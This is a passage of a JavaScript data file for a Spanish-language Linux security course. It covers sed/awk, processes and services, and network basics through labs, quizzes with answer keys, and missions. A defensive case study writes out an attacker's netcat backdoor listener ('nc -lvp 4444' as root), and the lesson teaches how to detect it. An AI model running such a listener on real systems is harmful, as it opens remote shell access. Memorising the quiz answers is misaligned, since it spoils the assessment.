    { type: 'multiple', question: 'Para capturar el output de una función en una variable:', options: ['var = funcion()', 'var=$(funcion)', 'var=`funcion`; (válido pero antiguo)', 'B y C son correctas'], correct: 3, explanation: 'Ambas $() y backticks capturan stdout de una función. $() es preferido por ser más legible y permitir anidamiento.' },
  ],
  missions: [
    { id: 'm1d13', title: 'Crea admin_lib.sh', description: 'Archivo de librería en scripts/', hint: '$ touch ~/scripts/admin_lib.sh', xp: 25, condition: condFile('~/scripts/admin_lib.sh') },
    { id: 'm2d13', title: 'Usa source para importar', description: 'source ~/scripts/admin_lib.sh', hint: '$ source ~/scripts/admin_lib.sh', xp: 35, condition: condCmd('source') },
    { id: 'm3d13', title: 'Define una función', description: 'Escribe una función en el shell', hint: '$ mi_funcion() { echo "hola"; }', xp: 30, condition: { type: 'command_matches', pattern: '\\(\\)\\s*\\{' } },
    { id: 'm4d13', title: 'Llama a una función', description: 'Ejecuta la función que creaste', hint: '$ mi_funcion', xp: 20, condition: condCmd('mi_funcion') },
  ],
  resources: [
    { name: 'Bash Functions', url: 'https://linuxize.com/post/bash-functions/', icon: '📖' },
    { name: 'Advanced Bash Scripting Guide', url: 'https://tldp.org/LDP/abs/html/', icon: '📚' },
  ],
},

// ─────────────────────────────────────────────────────────────
// DÍA 14 — Procesamiento de Texto: sed y awk
// ─────────────────────────────────────────────────────────────
{
  day: 14, title: 'Procesamiento de Texto: sed y awk',
  category: 'bash', xp: 450,
  tags: ['sed', 'awk', 'texto', 'procesamiento', 'regex'],
  objectives: [
    'Sustituir texto en archivos con sed',
    'Extraer columnas y campos con awk',
    'Procesar archivos CSV y logs con awk',
    'Combinar sed y awk en pipelines',
    'Automatizar edición de archivos de configuración',
  ],
  theory: {
    intro: 'sed y awk son las herramientas más poderosas para procesamiento de texto en Linux. Dominándolas puedes transformar, filtrar y analizar cualquier archivo de texto sin escribir un programa completo.',
    sections: [
      {
        type: 'dual',
        technical: 'sed (Stream Editor) aplica expresiones regulares a cada línea de texto. awk es un lenguaje de programación completo orientado a campos. Ambos procesan línea por línea (streaming), por lo que pueden manejar archivos de cualquier tamaño.',
        simple: 'sed es como buscar y reemplazar en un editor de texto, pero desde la terminal y con superpoderes. awk es como una hoja de cálculo de terminal: puede extraer columnas, sumar, contar y procesar datos tabulares.',
      },
      {
        type: 'text',
        title: 'sed: casos de uso principales',
        body: "sed 's/viejo/nuevo/g': sustituye todas las ocurrencias. sed -i 's/http/https/g' config.txt: edita el archivo directamente. sed '/patrón/d': elimina líneas. sed -n '1,10p': imprime solo líneas 1-10. sed 's/contraseña=.*/contraseña=REDACTED/g': oculta contraseñas en logs.",
      },
      {
        type: 'text',
        title: 'awk: procesamiento de campos',
        body: "awk '{print $1}': imprime el primer campo. awk -F: '{print $1}': usa : como separador. awk '$3 > 100': filtra líneas donde el campo 3 es mayor que 100. awk '{sum += $5} END {print sum}': suma todos los valores del campo 5. awk '/patrón/ {print $1, $3}': filtra y formatea.",
      },
      {
        type: 'note',
        label: 'sed y awk en análisis forense',
        body: "sed 's/\\(.*\\)password=\\([^ ]*\\)\\(.*\\)/\\1password=REDACTED\\3/g' log.txt anonimiza contraseñas en logs antes de compartirlos. awk '{print $1}' /var/log/auth.log | sort | uniq -c | sort -rn extrae IPs de los logs y las ordena por frecuencia de ataques.",
      },
    ],
    realCase: {
      title: 'Anonimización masiva de logs para análisis externo',
      body: "Un SOC necesita enviar logs a un proveedor externo para análisis. Antes de enviarlos, deben eliminar información sensible: contraseñas, IPs internas, nombres de usuario. Un pipeline de sed y awk puede procesar gigabytes de logs en minutos: cat auth.log | sed 's/from [0-9.]*/from X.X.X.X/g' | awk '{$9=\"REDACTED\"; print}'",
    },
  },
  commands: [
    {
      name: 'sed',
      brief: 'Stream Editor — editar texto línea por línea',
      technical: 'Lee stdin línea por línea, aplica el script de edición (expresión regular) y escribe en stdout. Con -i modifica el archivo in-place.',
      simple: 'Encuentra y reemplaza texto en archivos o en la salida de otros comandos.',
      syntax: [
        { cmd: "sed 's/viejo/nuevo/' archivo",        desc: 'Reemplazar primera ocurrencia por línea' },
        { cmd: "sed 's/viejo/nuevo/g' archivo",       desc: 'Reemplazar todas las ocurrencias (global)' },
        { cmd: "sed -i 's/http/https/g' config.txt",  desc: 'Editar archivo directamente (-i)' },
        { cmd: "sed '/patrón/d' archivo",             desc: 'Eliminar líneas que coinciden' },
        { cmd: "sed -n '5,10p' archivo",              desc: 'Mostrar solo líneas 5 a 10' },
        { cmd: "sed 's/pass=.*/pass=OCULTO/g' log",  desc: 'Ocultar contraseñas en logs' },
      ],
      errors: [
        { msg: "sed: -e expression #1, char X: unterminated 's' command", fix: "El patrón de sustitución necesita 3 delimitadores: s/buscar/reemplazar/" },
      ],
      security: "sed -i.bak 's/PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config es un comando de hardening que deshabilita el login de root por SSH.",
    },
    {
      name: 'awk',
      brief: 'Procesamiento de campos en texto tabulado',
      technical: 'Divide cada línea en campos según el separador (default: espacios). Ejecuta el programa awk para cada línea. NR=número de línea, NF=número de campos, $0=línea completa.',
      simple: 'Extrae columnas específicas de texto, como seleccionar columnas en Excel pero desde la terminal.',
      syntax: [
        { cmd: "awk '{print $1}' archivo",             desc: 'Imprimir primer campo' },
        { cmd: "awk '{print $1, $3}' archivo",         desc: 'Imprimir campos 1 y 3' },
        { cmd: "awk -F: '{print $1}' /etc/passwd",     desc: 'Separador personalizado (:)' },
        { cmd: "awk 'NR==1' archivo",                  desc: 'Imprimir solo la primera línea' },
        { cmd: "awk '$3 > 100 {print $1}' datos",      desc: 'Filtrar e imprimir' },
        { cmd: "awk '{sum+=$5} END {print sum}' datos",desc: 'Sumar campo 5' },
        { cmd: "awk '{print NR, $0}' archivo",         desc: 'Añadir números de línea' },
      ],
      errors: [
        { msg: "awk: line 1: syntax error at or near }", fix: "Verifica que el programa awk esté entre comillas simples y tenga llaves correctas." },
      ],
      security: "awk '{print $1}' /var/log/auth.log | sort | uniq -c | sort -rn | head -20 muestra las IPs más activas en los logs de autenticación.",
    },
  ],
  lab: {
    title: 'Procesamiento de logs de seguridad con sed y awk',
    context: 'Debes analizar logs del servidor y generar un reporte de seguridad usando sed y awk para transformar y extraer datos relevantes.',
    duration: '30 min', xp: 150,
    steps: [
      {
        title: 'Extrae usuarios con awk',
        body: 'Usa awk para extraer solo los nombres de usuario de /etc/passwd.',
        commands: [{ cmd: "awk -F: '{print $1}' /etc/passwd", explanation: '-F: usa : como separador de campos. $1 es el primer campo (nombre de usuario).' }],
        expected: 'root\ndaemon\nstudiante',
        technical: '/etc/passwd tiene formato: nombre:x:UID:GID:info:home:shell. awk -F: extrae el campo que necesitas.',
        hints: ["$ awk -F: '{print $1}' /etc/passwd"],
      },
      {
        title: 'Extrae UIDs de usuarios reales',
        body: 'Filtra usuarios con UID >= 1000 (usuarios reales, no del sistema).',
        commands: [{ cmd: "awk -F: '$3 >= 1000 {print $1, $3}' /etc/passwd", explanation: 'Filtra por UID >= 1000 e imprime nombre y UID.' }],
        expected: 'estudiante 1000',
        technical: 'awk puede filtrar ($3 >= 1000) y formatear la salida en una sola operación.',
        hints: ["$ awk -F: '$3 >= 1000 {print $1, $3}' /etc/passwd"],
      },
      {
        title: 'Sustituye texto con sed',
        body: 'Crea un reporte ocultando información sensible del passwd.',
        commands: [
          { cmd: "cat /etc/passwd | sed 's/x:[0-9]*/x:OCULTO/g'", explanation: 'Oculta UIDs y el marcador de contraseña.' },
        ],
        expected: 'root:OCULTO:0:root:/root:/bin/bash',
        technical: "s/patron/reemplazo/g: la g al final reemplaza todas las ocurrencias en cada línea, no solo la primera.",
        hints: ["$ cat /etc/passwd | sed 's/x:[0-9]*/x:OCULTO/g'"],
      },
      {
        title: 'Procesa logs con awk',
        body: 'Extrae las horas de los eventos del syslog.',
        commands: [{ cmd: "awk '{print $3}' /var/log/syslog", explanation: 'El campo 3 del syslog es la hora.' }],
        expected: '10:00:01\n10:00:02\n10:01:15',
        technical: 'El formato de syslog es: Mes Día Hora Host Proceso[PID]: Mensaje. awk puede extraer cualquier campo.',
        hints: ["$ awk '{print $3}' /var/log/syslog"],
      },
      {
        title: 'Pipeline completo de análisis',
        body: 'Combina awk y sort para análisis de frecuencia.',
        commands: [{ cmd: "awk '{print $4}' /var/log/syslog | sort | uniq -c | sort -rn", explanation: 'Extrae el proceso, cuenta ocurrencias y ordena de mayor a menor.' }],
        expected: '3 linux-academy\n2 sshd',
        technical: 'Este pipeline (awk→sort→uniq -c→sort -rn) es el patrón más clásico de análisis de frecuencia en logs de seguridad.',
        hints: ["$ awk '{print $4}' /var/log/syslog | sort | uniq -c | sort -rn"],
      },
    ],
    commonErrors: [
      { error: "awk: can't open file", solution: 'Verifica que el archivo existe. Usa ls antes de procesar.' },
      { error: "sed: unterminated s command", solution: "La sustitución necesita 3 / : s/buscar/reemplazar/ — verifica que no falte ninguno." },
    ],
  },
  quiz: [
    { type: 'fill', question: "Para reemplazar TODAS las ocurrencias de 'http' por 'https' en un archivo: `sed 's/http/https/___' archivo`", correct: ['g'], explanation: "La flag g (global) al final de la sustitución reemplaza todas las ocurrencias en cada línea, no solo la primera." },
    { type: 'multiple', question: '¿Qué hace `awk -F: \'{print $3}\' /etc/passwd`?', options: ['Imprime la tercera línea', 'Imprime el tercer campo (UID) usando : como separador', 'Busca el patrón $3', 'Imprime las primeras 3 líneas'], correct: 1, explanation: '-F: establece el separador de campos. $3 es el tercer campo (UID en /etc/passwd).' },
    { type: 'true_false', question: '`sed -i` modifica el archivo directamente sin crear una copia temporal.', correct: true, explanation: 'sed -i edita el archivo in-place. Se puede usar sed -i.bak para guardar un backup: sed -i.bak s/old/new/ archivo' },
    { type: 'multiple', question: '¿Qué hace el pipeline `cat log.txt | awk \'{print $1}\' | sort | uniq -c`?', options: ['Cuenta líneas únicas', 'Extrae el primer campo, ordena y cuenta frecuencias de cada valor', 'Busca duplicados', 'Elimina duplicados'], correct: 1, explanation: 'Este pipeline clásico: extrae el campo, sort agrupa iguales, uniq -c cuenta repeticiones. Fundamental para análisis de IPs en logs.' },
    { type: 'fill', question: "En awk, para imprimir la línea completa (todos los campos): `awk '{print ___}'`", correct: ['$0'], explanation: '$0 en awk representa la línea completa. $1, $2, $3... son campos individuales. NF es el último campo.' },
  ],
  missions: [
    { id: 'm1d14', title: 'Usa awk para extraer campos', description: "awk -F: '{print $1}' /etc/passwd", hint: "$ awk -F: '{print $1}' /etc/passwd", xp: 35, condition: condCmd('awk') },
    { id: 'm2d14', title: 'Usa sed para sustituir', description: "sed 's/viejo/nuevo/g'", hint: "$ echo 'hola mundo' | sed 's/mundo/linux/'", xp: 35, condition: condCmd('sed') },
    { id: 'm3d14', title: 'Combina awk con sort', description: "awk | sort | uniq -c", hint: "$ awk '{print $1}' /var/log/syslog | sort | uniq -c", xp: 40, condition: { type: 'command_executed', command: "awk '{print $1}' /var/log/syslog | sort | uniq -c" } },
    { id: 'm4d14', title: 'Extrae UIDs con awk', description: "awk -F: '$3 >= 1000'", hint: "$ awk -F: '$3 >= 1000 {print $1}' /etc/passwd", xp: 40, condition: { type: 'command_matches', pattern: "awk.*>=.*1000" } },
  ],
  resources: [
    { name: 'sed Manual', url: 'https://www.gnu.org/software/sed/manual/', icon: '📖' },
    { name: 'awk Tutorial', url: 'https://www.grymoire.com/Unix/Awk.html', icon: '📚' },
  ],
},

// ─────────────────────────────────────────────────────────────
// DÍA 15 — Gestión de Procesos y Servicios
// ─────────────────────────────────────────────────────────────
{
  day: 15, title: 'Gestión de Procesos y Servicios',
  category: 'linux', xp: 450,
  tags: ['procesos', 'ps', 'kill', 'systemctl', 'servicios', 'top'],
  objectives: [
    'Listar y monitorear procesos con ps y top',
    'Entender PIDs, PPIDs y jerarquía de procesos',
    'Terminar procesos con kill y killall',
    'Gestionar servicios con systemctl',
    'Detectar procesos sospechosos',
  ],
  theory: {
    intro: 'Cada programa en ejecución es un proceso. Entender cómo monitorear y controlar procesos es fundamental para la administración de sistemas y para detectar software malicioso.',
    sections: [
      {
        type: 'dual',
        technical: 'Un proceso es una instancia de un programa en ejecución con su propio espacio de memoria, PID y estado. Los procesos forman un árbol: init/systemd (PID 1) es el padre de todos. fork() crea un proceso hijo. exec() reemplaza la imagen del proceso. Los señales (SIGTERM=15, SIGKILL=9) controlan el ciclo de vida.',
        simple: 'Un proceso es un programa corriendo. Cuando abres el navegador, se crea un proceso. Cuando lo cierras, el proceso termina. El sistema operativo gestiona miles de procesos simultáneamente asignando tiempo de CPU a cada uno.',
      },
      {
        type: 'text',
        title: 'Señales de proceso',
        body: 'SIGTERM (15): pide al proceso que termine limpiamente (puede ignorarse). SIGKILL (9): termina el proceso inmediatamente (no puede ignorarse). SIGHUP (1): recargar configuración. SIGSTOP (19): pausar proceso. SIGCONT (18): continuar proceso pausado. Los procesos bien escritos manejan SIGTERM para cerrar archivos y liberar recursos antes de terminar.',
      },
      {
        type: 'note',
        label: 'Procesos y seguridad',
        body: 'Los malware a menudo se camuflan con nombres similares a procesos legítimos: "systemd" vs "systemd " (con espacio), "kworker" malicioso. ps aux | grep -v grep | sort -k3 -rn muestra los procesos ordenados por uso de CPU. Un proceso desconocido consumiendo muchos recursos puede ser malware o un cryptominer.',
      },
    ],
    realCase: {
      title: 'Detectar un cryptominer en un servidor comprometido',
      body: "Un administrador nota que el servidor va lento. Con top ve un proceso llamado 'kdevtmpfsi' usando el 99% de CPU. ps aux muestra que fue iniciado desde /tmp. ls -la /tmp/ revela el ejecutable malicioso. El atacante instaló un cryptominer. Se elimina con kill -9 PID y se busca el punto de entrada.",
    },
  },
  commands: [
    {
      name: 'ps',
      brief: 'Process Status — listar procesos en ejecución',
      technical: 'Lee el sistema de archivos /proc que expone información de cada proceso como archivos. ps aux lee /proc/[pid]/stat, status, cmdline para cada PID.',
      simple: 'Muestra qué programas están corriendo en el sistema en este momento.',
      syntax: [
        { cmd: 'ps',              desc: 'Procesos del terminal actual' },
        { cmd: 'ps aux',          desc: 'TODOS los procesos del sistema' },
        { cmd: 'ps aux | grep nginx', desc: 'Buscar proceso específico' },
        { cmd: 'ps -ef',          desc: 'Formato alternativo con PPID' },
        { cmd: 'ps aux --sort=-pcpu | head -10', desc: 'Top 10 por CPU' },
      ],
      errors: [],
      security: 'ps aux | awk \'$11 ~ /^\\/tmp/\' muestra procesos ejecutándose desde /tmp, señal de malware.',
    },
    {
      name: 'kill',
      brief: 'Enviar señales a procesos',
      technical: 'Envía la señal especificada al proceso con el PID dado usando la syscall kill(). Sin señal especificada, envía SIGTERM (15).',
      simple: 'Termina un proceso. Primero intenta con kill (educado), si no responde usa kill -9 (forzado).',
      syntax: [
        { cmd: 'kill', arg: '1234',      desc: 'Enviar SIGTERM al PID 1234' },
        { cmd: 'kill', flag: '-9', arg: '1234',  desc: 'Forzar terminación (SIGKILL)' },
        { cmd: 'kill', flag: '-15', arg: '1234', desc: 'SIGTERM explícito' },
        { cmd: 'killall', arg: 'nginx',  desc: 'Terminar todos los procesos nginx' },
        { cmd: 'pkill', arg: 'firefox',  desc: 'Terminar por nombre (partial match)' },
      ],
      errors: [
        { msg: 'kill: Operation not permitted', fix: 'Solo puedes matar procesos de tu usuario. Para matar procesos de root necesitas sudo.' },
        { msg: 'kill: No such process', fix: 'El PID ya no existe. El proceso ya terminó.' },
      ],
      security: 'kill -9 nunca falla en terminar un proceso (excepto procesos zombie). Úsalo como último recurso después de SIGTERM.',
    },
    {
      name: 'systemctl',
      brief: 'Controlar servicios del sistema (systemd)',
      technical: 'Interfaz con systemd (PID 1). Gestiona units (servicios, timers, mounts) a través de D-Bus.',
      simple: 'Inicia, detiene, reinicia y verifica el estado de servicios del sistema como el servidor web, SSH o el firewall.',
      syntax: [
        { cmd: 'systemctl status ssh',    desc: 'Ver estado del servicio SSH' },
        { cmd: 'systemctl start nginx',   desc: 'Iniciar nginx' },
        { cmd: 'systemctl stop nginx',    desc: 'Detener nginx' },
        { cmd: 'systemctl restart nginx', desc: 'Reiniciar nginx' },
        { cmd: 'systemctl enable nginx',  desc: 'Activar al inicio del sistema' },
        { cmd: 'systemctl disable nginx', desc: 'Desactivar al inicio' },
        { cmd: 'systemctl list-units',    desc: 'Listar todos los servicios' },
      ],
      errors: [
        { msg: 'Failed to restart service: Unit not found', fix: 'El servicio no está instalado. Verifica el nombre con systemctl list-units | grep nombre.' },
      ],
      security: 'systemctl list-units --state=failed muestra servicios que fallaron — pueden indicar un intento de ataque o configuración incorrecta.',
    },
  ],
  lab: {
    title: 'Auditoría de procesos y servicios del sistema',
    context: 'Debes auditar el servidor para detectar procesos sospechosos y verificar que los servicios críticos están funcionando correctamente.',
    duration: '30 min', xp: 150,
    steps: [
      {
        title: 'Lista todos los procesos',
        body: 'Obtén una vista completa de todos los procesos en ejecución.',
        commands: [{ cmd: 'ps aux', explanation: 'Lista todos los procesos con usuario, PID, CPU, memoria y comando.' }],
        expected: 'USER  PID  %CPU  %MEM  COMMAND\nroot    1   0.0   0.1  /sbin/init',
        technical: 'ps aux: a=todos los usuarios, u=formato de usuario, x=incluir procesos sin terminal.',
        hints: ['$ ps aux'],
      },
      {
        title: 'Busca procesos por nombre',
        body: 'Encuentra todos los procesos bash corriendo.',
        commands: [{ cmd: 'ps aux | grep bash', explanation: 'Filtra la lista de procesos buscando "bash".' }],
        expected: 'estudiante 1000 0.1 0.3 bash',
        technical: 'Combinar ps aux con grep es el método estándar para encontrar procesos específicos.',
        hints: ['$ ps aux | grep bash'],
      },
      {
        title: 'Verifica el estado de servicios',
        body: 'Comprueba el estado del servicio SSH.',
        commands: [{ cmd: 'systemctl status ssh', explanation: 'Ver si SSH está activo y sin errores.' }],
        expected: '● ssh.service - OpenBSD Secure Shell server\n   Active: active (running)',
        technical: 'systemctl status muestra el estado, logs recientes y tiempo de uptime del servicio.',
        hints: ['$ systemctl status ssh'],
      },
      {
        title: 'Lista servicios activos',
        body: 'Ve qué servicios están corriendo en el sistema.',
        commands: [{ cmd: 'systemctl list-units --type=service --state=active', explanation: 'Solo servicios activos.' }],
        expected: 'cron.service  loaded active running\nssh.service   loaded active running',
        technical: 'Conocer los servicios activos es fundamental en hardening: cualquier servicio innecesario es una superficie de ataque.',
        hints: ['$ systemctl list-units --type=service --state=active'],
      },
      {
        title: 'Detecta procesos con alto uso de CPU',
        body: 'Encuentra los procesos que más CPU consumen.',
        commands: [{ cmd: 'ps aux --sort=-%cpu | head -5', explanation: 'Ordena por CPU (descendente) y muestra los 5 primeros.' }],
        expected: 'bash  1000  0.3  proceso con más CPU',
        technical: '--sort=-%cpu ordena de mayor a menor consumo de CPU. Los cryptominers aparecen aquí con 99%.',
        hints: ['$ ps aux --sort=-%cpu | head -5'],
      },
    ],
    commonErrors: [
      { error: 'kill: Operation not permitted', solution: 'No puedes terminar procesos de otros usuarios. Necesitas sudo para procesos de root.' },
    ],
  },
  quiz: [
    { type: 'fill', question: 'Para terminar forzosamente un proceso con PID 1234: `kill ___ 1234`', correct: ['-9', '-KILL', '-SIGKILL'], explanation: '-9 envía SIGKILL que no puede ser ignorado por el proceso. Siempre termina (excepto procesos zombie).' },
    { type: 'multiple', question: '¿Cuál es el PID del proceso padre de todos los procesos en Linux moderno?', options: ['0', '1', '100', '255'], correct: 1, explanation: 'PID 1 es systemd (o init en sistemas más antiguos). Es el primer proceso que inicia el kernel y el padre directo o indirecto de todos los demás.' },
    { type: 'true_false', question: '`systemctl enable servicio` inicia el servicio inmediatamente.', correct: false, explanation: 'enable solo activa el servicio para que inicie automáticamente en el próximo reinicio. Para iniciarlo ahora usa systemctl start.' },
    { type: 'multiple', question: 'Un proceso consume 99% de CPU y fue iniciado desde /tmp. ¿Qué sospechas?', options: ['Es un proceso normal del kernel', 'Es probablemente un cryptominer o malware', 'Es el antivirus escaneando', 'Es una actualización del sistema'], correct: 1, explanation: 'Procesos en /tmp con alto CPU son señal de malware. Los ejecutables legítimos están en /usr/bin, /bin o similares, nunca en /tmp.' },
    { type: 'multiple', question: '¿Qué comando muestra todos los servicios que fallaron en systemd?', options: ['systemctl list-failed', 'systemctl status --failed', 'systemctl list-units --state=failed', 'ps aux | grep failed'], correct: 2, explanation: 'systemctl list-units --state=failed muestra las units (servicios, timers, etc.) en estado fallido.' },
  ],
  missions: [
    { id: 'm1d15', title: 'Ejecuta ps aux', description: 'Lista todos los procesos', hint: '$ ps aux', xp: 25, condition: { type: 'command_with_flag', command: 'ps', flag: 'aux' } },
    { id: 'm2d15', title: 'Busca procesos bash', description: 'ps aux | grep bash', hint: '$ ps aux | grep bash', xp: 30, condition: { type: 'command_executed', command: 'ps aux | grep bash' } },
    { id: 'm3d15', title: 'Verifica estado de SSH', description: 'systemctl status ssh', hint: '$ systemctl status ssh', xp: 35, condition: { type: 'command_executed', command: 'systemctl status ssh' } },
    { id: 'm4d15', title: 'Lista servicios activos', description: 'systemctl list-units', hint: '$ systemctl list-units --type=service', xp: 30, condition: condCmd('systemctl') },
  ],
  resources: [
    { name: 'systemd Documentation', url: 'https://www.freedesktop.org/wiki/Software/systemd/', icon: '⚙️' },
    { name: 'Linux Process Management', url: 'https://www.digitalocean.com/community/tutorials/how-to-use-ps-kill-and-nice-to-manage-processes-in-linux', icon: '📖' },
  ],
},

// ─────────────────────────────────────────────────────────────
// DÍA 16 — Redes en Linux: Conceptos Base
// ─────────────────────────────────────────────────────────────
{
  day: 16, title: 'Redes en Linux: Conceptos Base',
  category: 'linux', xp: 450,
  tags: ['redes', 'ip', 'ping', 'netstat', 'ss', 'ifconfig'],
  objectives: [
    'Ver y configurar interfaces de red con ip',
    'Verificar conectividad con ping',
    'Ver conexiones activas con ss/netstat',
    'Entender puertos y protocolos',
    'Detectar conexiones sospechosas',
  ],
  theory: {
    intro: 'Las redes son el campo de batalla de la ciberseguridad. Entender cómo Linux gestiona las conexiones de red es esencial para detectar ataques, configurar firewalls y analizar tráfico sospechoso.',
    sections: [
      {
        type: 'dual',
        technical: 'Linux gestiona la red a través del stack TCP/IP del kernel. Las interfaces de red (eth0, lo, wlan0) son manejadas por drivers. ip (iproute2) reemplazó ifconfig para configurar interfaces, rutas y políticas. ss (socket statistics) reemplazó netstat para ver conexiones TCP/UDP.',
        simple: 'Cada computadora en una red tiene una dirección IP (como una dirección postal). Los puertos son como puertas en esa dirección: el puerto 22 es SSH, 80 es web, 443 es web seguro. Las herramientas de red te permiten ver quién está conectado a tu servidor.',
      },
      {
        type: 'text',
        title: 'Puertos importantes que debes conocer',
        body: '22=SSH, 23=Telnet (inseguro), 25=SMTP (email), 53=DNS, 80=HTTP, 443=HTTPS, 3306=MySQL, 5432=PostgreSQL, 6379=Redis, 8080=HTTP alternativo, 27017=MongoDB. Un servidor que expone puertos innecesarios tiene mayor superficie de ataque.',
      },
      {
        type: 'note',
        label: 'Detección de conexiones maliciosas',
        body: "ss -tunap muestra todas las conexiones con PID del proceso. Conexiones a IPs extrañas, procesos escuchando en puertos no estándar, o conexiones establecidas de procesos del sistema (como cron) son señales de alerta. netstat -an | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn lista IPs conectadas.",
      },
    ],
    realCase: {
      title: 'Detectar un backdoor de red instalado por un atacante',
      body: "Un atacante instaló un proceso que escucha en el puerto 4444 (puerto típico de Metasploit). ss -tunap | grep 4444 lo revela: nc -lvp 4444 corriendo como root. El atacante tiene una shell remota. El administrador termina el proceso, cierra el puerto con el firewall y busca cómo el atacante obtuvo acceso.",
    },
  },
  commands: [
    {
      name: 'ip',
      brief: 'Gestión de interfaces de red, rutas y políticas',
      technical: 'ip es parte de iproute2, la suite moderna de herramientas de red de Linux. Interactúa con el kernel vía Netlink sockets.',
      simple: 'Muestra y configura las interfaces de red, direcciones IP y rutas de tu sistema.',
      syntax: [
        { cmd: 'ip addr',          desc: 'Ver todas las interfaces y sus IPs' },
        { cmd: 'ip addr show eth0', desc: 'Ver interfaz específica' },
        { cmd: 'ip route',         desc: 'Ver tabla de rutas' },
        { cmd: 'ip link',          desc: 'Ver estado de interfaces' },
      ],
      errors: [],
      security: 'ip addr muestra tu IP real. Comparar con lo que el servidor debe tener puede revelar interfaces de red no autorizadas (pivoting).',
    },
    {
      name: 'ping',
      brief: 'Verificar conectividad de red',
      technical: 'Envía paquetes ICMP Echo Request y espera ICMP Echo Reply. Mide RTT (Round Trip Time).',
      simple: 'Comprueba si puedes llegar a otra computadora en la red. Como llamar por teléfono para ver si alguien contesta.',
      syntax: [
        { cmd: 'ping', arg: 'google.com',          desc: 'Ping continuo (Ctrl+C para parar)' },
        { cmd: 'ping', flag: '-c 4', arg: '8.8.8.8', desc: 'Solo 4 pings' },
        { cmd: 'ping', flag: '-c 1', arg: 'host 2>/dev/null && echo "up" || echo "down"', desc: 'Verificar si host está activo' },
      ],
      errors: [
        { msg: 'Network is unreachable', fix: 'Sin ruta al destino. Verifica la interfaz de red con ip addr y la ruta con ip route.' },
        { msg: 'Destination Host Unreachable', fix: 'El host no responde. Puede estar apagado o bloquear ICMP.' },
      ],
      security: 'ping es una herramienta de reconocimiento básica. Bloquear ICMP en el firewall oculta el servidor del ping sweep, pero no lo hace invisible.',
    },
    {
      name: 'ss',
      brief: 'Socket Statistics — ver conexiones de red',
      technical: 'Lee información de sockets del kernel vía Netlink. Reemplazo moderno y más rápido de netstat.',
      simple: 'Muestra todas las conexiones de red: qué puertos están abiertos, quién está conectado y desde dónde.',
      syntax: [
        { cmd: 'ss',                   desc: 'Conexiones establecidas' },
        { cmd: 'ss', flag: '-tun',     desc: 'TCP+UDP, nombres de servicio' },
        { cmd: 'ss', flag: '-tunap',   desc: 'Con PID del proceso (-p) y dirección numérica (-n)' },
        { cmd: 'ss', flag: '-tlnp',    desc: 'Solo puertos en escucha (listening)' },
        { cmd: 'ss -tunap | grep :22', desc: 'Ver conexiones al puerto SSH' },
      ],
      errors: [],
      security: 'ss -tunap es el primer comando para detectar backdoors: procesos escuchando en puertos desconocidos o conexiones a IPs sospechosas.',
    },
  ],
  lab: {
    title: 'Auditoría de red: detectar conexiones y puertos sospechosos',
    context: 'Recibes una alerta de seguridad: se sospecha que hay una conexión de red no autorizada en el servidor. Debes investigar.',
    duration: '25 min', xp: 150,
    steps: [
      {
        title: 'Verifica las interfaces de red',
        body: 'Identifica todas las interfaces de red y sus IPs.',
        commands: [{ cmd: 'ip addr', explanation: 'Lista todas las interfaces con sus direcciones IP.' }],
        expected: '1: lo: 127.0.0.1/8\n2: eth0: 192.168.1.105/24',
        technical: 'lo es el loopback (127.0.0.1). eth0/ens33 es la interfaz de red principal. Interfaces desconocidas pueden indicar un ataque de pivoting.',
        hints: ['$ ip addr'],
      },
      {
        title: 'Verifica la conectividad',
        body: 'Comprueba que el servidor puede llegar a la red.',
        commands: [{ cmd: 'ping -c 3 127.0.0.1', explanation: 'Ping al loopback (siempre debe funcionar).' }],
        expected: '3 packets transmitted, 3 received, 0% packet loss',
        technical: '0% packet loss indica conectividad perfecta. Pérdida de paquetes puede indicar problemas de red o filtrado.',
        hints: ['$ ping -c 3 127.0.0.1'],
      },
      {
        title: 'Lista puertos en escucha',
        body: 'Identifica qué puertos tiene el servidor abiertos.',
        commands: [{ cmd: 'ss -tlnp', explanation: '-t=TCP, -l=listening (escuchando), -n=numérico, -p=PID.' }],
        expected: 'LISTEN 0.0.0.0:22   sshd\nLISTEN 127.0.0.1:631 cupsd',
        technical: 'Solo deben estar abiertos los puertos necesarios. Cada puerto abierto es una potencial superficie de ataque.',
        hints: ['$ ss -tlnp'],
      },
      {
        title: 'Ver todas las conexiones activas',
        body: 'Lista todas las conexiones TCP establecidas.',
        commands: [{ cmd: 'ss -tunap', explanation: 'Todas las conexiones TCP y UDP con PID.' }],
        expected: 'tcp ESTAB 192.168.1.105:22 192.168.1.100:52341 sshd',
        technical: 'ESTAB = conexión establecida. TIME-WAIT = conexión cerrándose. LISTEN = esperando conexiones.',
        hints: ['$ ss -tunap'],
      },
      {
        title: 'Busca conexiones a puertos sospechosos',
        body: 'Filtra conexiones en puertos no estándar.',
        commands: [{ cmd: "ss -tunap | grep -v ':22\\|:631\\|127.0.0.1'", explanation: 'Muestra conexiones que NO son SSH, CUPS o loopback.' }],
        expected: '(sin resultados o conexiones conocidas)',
        technical: 'En un servidor bien configurado, solo deberían aparecer los servicios autorizados. Cualquier otro es sospechoso.',
        hints: ["$ ss -tunap | grep -v ':22'"],
      },
    ],
    commonErrors: [
      { error: 'Network is unreachable', solution: 'Sin conectividad. Verifica con ip addr que la interfaz tiene IP y con ip route que hay ruta por defecto.' },
    ],
  },
  quiz: [
    { type: 'fill', question: "Para ver todos los puertos TCP en escucha con el proceso que los usa: `ss ___`", correct: ['-tlnp', '-tlnp '], explanation: '-t=TCP, -l=listening, -n=numérico (no resolver nombres), -p=mostrar PID del proceso.' },
    { type: 'multiple', question: '¿En qué puerto escucha SSH por defecto?', options: ['21', '22', '23', '80'], correct: 1, explanation: 'SSH usa el puerto 22 por defecto. Muchos administradores lo cambian a otro puerto para reducir el ruido de ataques automatizados.' },
    { type: 'true_false', question: '`ip addr` reemplaza al antiguo comando `ifconfig` en sistemas Linux modernos.', correct: true, explanation: 'ip (parte de iproute2) es el reemplazo moderno de ifconfig (net-tools). En Ubuntu 22.04, ifconfig ya no está instalado por defecto.' },
    { type: 'multiple', question: 'Encuentras un proceso escuchando en el puerto 4444. ¿Qué sospechas?', options: ['Es un servidor web seguro', 'Posible backdoor de Metasploit', 'Es DNS', 'Es MySQL'], correct: 1, explanation: 'El puerto 4444 es el puerto por defecto del handler de Metasploit. Un proceso escuchando ahí es señal de backdoor.' },
